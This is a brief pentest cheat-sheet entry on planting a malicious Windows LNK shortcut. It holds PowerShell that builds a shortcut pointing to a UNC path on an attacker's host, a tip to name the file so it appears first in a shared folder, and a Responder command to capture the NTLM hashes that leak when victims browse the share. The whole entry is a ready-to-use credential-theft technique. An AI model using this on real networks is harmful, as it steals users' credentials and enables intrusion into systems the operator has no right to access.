LNK File
```powershell
$objShell = New-Object -ComObject WScript.shell 
$lnk = $objShell.CreateShortcut("C:\test.lnk") 
$lnk.TargetPath = "\\<attacker IP>\@test.png" 
$lnk.WindowStyle = 1 
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3" 
$lnk.Description = "Test" 
$lnk.HotKey = "Ctrl+Alt+T" 
$lnk.Save()
```
- Put ~ or @ in front of LNK, so these files will always be on top
```bash
responder -I <INTERFACE> -wdPv
```